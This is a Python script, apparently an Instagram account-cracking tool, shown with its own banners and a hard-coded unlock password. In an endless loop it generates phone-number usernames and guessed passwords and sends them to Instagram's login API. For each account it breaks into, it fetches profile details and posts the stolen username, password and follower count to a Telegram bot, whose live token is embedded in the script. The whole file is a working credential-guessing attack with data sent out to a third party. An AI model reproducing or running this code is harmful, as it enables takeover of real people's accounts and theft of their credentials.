import time
import pyfiglet
import sys
X = '' #احمر
A = '\033[2;34m'#ازرق
print(' ')
def j(z):
    for e in z:
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(3/5000)
j('\033[1;31m-'*60)
hunter = pyfiglet.figlet_format("KRO")
print(' ')
def j(z):
    for e in z:
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(3/1000)
j(A+hunter)
print(' ')
def j(z):
    for e in z:
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(3/5000)
j('\033[1;31m-'*60)

import sys
import time
KRO ="KRO"

for i in range (9999999) : 
      pwd = input (A+"        [=] Pass ? : ")
      j = 9999999
      if ( pwd==KRO ) : 
              print ("") 
              break    
def jalan(z):
 for e in z + '\n':
  sys.stdout.write(e)
  sys.stdout.flush()
  time.sleep(3/1000)
jalan('''Please Wait 5 - Vc..''')
import time
import pyfiglet
import sys
import os
import sys
import uuid
import sys
import time
import random
import requests
import pyfiglet
import time
import sys
from secrets import token_hex
import secrets
from uuid import uuid4
uid = uuid4()
os.system('clear')
aa=0
zz=0
#--------------------
Z = '\033[1;31m' #احمر
X = '\033[1;33m' #اصفر
Z1 = '\033[2;31m' #احمر ثاني
F = '\033[2;32m' #اخضر
A = '\033[2;34m'#ازرق
C = '\033[2;35m' #وردي
B = '\033[2;36m'#سمائي
Y = '\033[1;34m' #ا
#--------------------

import time
import pyfiglet
import sys
print(' ')
print(Z1+'-'*50)
def j(z):
    for e in z:
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(3/5000)
hunter = pyfiglet.figlet_format(" - KEROO - ")
print(' ')
def j(z):
    for e in z:
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(3/1000)
j(X+hunter)
print(' ')
def j(z):
    for e in z:
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(3/5000)
print(Z1+'-'*50)        
        

ur = input ('username :')
pa = input ('password :')
ID = '2021068735'

token = '2052387062:AAGO4ZwvpBMC_Q0Lu5OqmndYOsFfnrQjELY'
print(Z1+'-'*50)

print(B+' - SuRs Cod 𝗞𝗘𝗥𝗢𝗢 - : @VYIYY')

print(Z1+'-'*50)

r = requests.Session()
user = '1234567890'
while True:	
	us = str(''.join(random.choice(user)for i in range(6)))
	username = '+989' + ur + us
	password = '09' + pa + us
	cookies = token_hex(8) * 2
	url='https://i.instagram.com/api/v1/accounts/login/'
	headers = {'User-Agent':'Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Nexus 6P; angler; angler; en_US)',  'Accept':'*/*',
                 'Cookie':'missing',
                 'Accept-Encoding':'gzip, deflate',
                 'Accept-Language':'en-US',
                 'X-IG-Capabilities':'3brTvw==',
                 'X-IG-Connection-Type':'WIFI',
                 'Content-Type':'application/x-www-form-urlencoded; charset=UTF-8',
              'Host':'i.instagram.com'}
	data = {'uuid':uid,  'password':password,
              'username':username,
              'device_id':uid,
              'from_reg':'false',
              '_csrftoken':'missing',
              'login_attempt_countn':'0'}
	req_login = r.post(url,headers=headers, data=data)
	if 'logged_in_user' in req_login.json():
		zz+=1
		user8= req_login.json()['logged_in_user']['username']
		url_id = f'https://www.instagram.com/{user8}/?__a=1'
		cookie = secrets.token_hex(8)*2
		head = {
            'HOST': "www.instagram.com",
            'KeepAlive' : 'True',
            'user-agent' : "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2842.99 Safari/537.36",
            'Cookie': cookie,
            'Accept' : "*/*",
            'ContentType' : "application/x-www-form-urlencoded",
            "X-Requested-With" : "XMLHttpRequest",
            "X-IG-App-ID": "936619743392459",
            "X-Instagram-AJAX" : "missing",
            "X-CSRFToken" : "missing",
            "Accept-Language" : "en-US,en;q=0.9"
		}
		req_id= requests.get(url_id,headers=head).json()
		name    = str(req_id['graphql']['user']['full_name'])
		id    = str(req_id['graphql']['user']['id'])
		followes    = str(req_id['graphql']['user']['edge_followed_by']['count'])
		following    = str(req_id['graphql']['user']['edge_follow']['count'])
		
		re = requests.get(f"https://o7aa.pythonanywhere.com/?id={id}")
		ree = re.json()
		data8 = ree['data']
		tlg = (f'''https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text= 𝗡𝗲𝘄 𝗞𝗥𝗢 , 𝗔𝗰𝗰𝗼𝘂𝗻𝘁 𝗜𝗻𝘀𝘁𝗮
• - - - - - - - - - - - - - - - - - - - - - - - - •
- 𝗨𝘀𝗲𝗿𝗡𝗮𝗺𝗲 : {user8}
- 𝗣𝗮𝘀𝘀𝘄𝗼𝗿𝗱 : {password}
- 𝗙𝗹𝗼𝗪𝗲𝗥𝘀 : {followes}
- 𝗩𝘀 𝗗𝗮𝗧𝗮 : {data8}
- 𝗩𝘀 𝗛𝗮𝗰𝗞 : {zz}
• - - - - - - - - - - - - - - - - - - - - - - - - •
- 𝗙𝗿𝗢𝗺 𝗧𝗲𝗹𝗲 : @EE_EEI''')
		i = requests.post(tlg)
			
		print(f"\r \n \033[1;31m - NoT HaCkInG - {aa} :  '\033[1;34m{username}  -  {password} :",end='')
	if '"message":"challenge_required"' in req_login.text:	       
	       print(f"\r \n \033[1;33m - NoW HaCkInG - {aa} :  '\033[1;34m{username}  -  {password} :",end='')
	else:
		   print(f"\r  - '\033[1;31m - NoT HaCkInG - {aa} :  '\033[1;34m{username}  -  {password} :  ",end='')
		   aa+=1
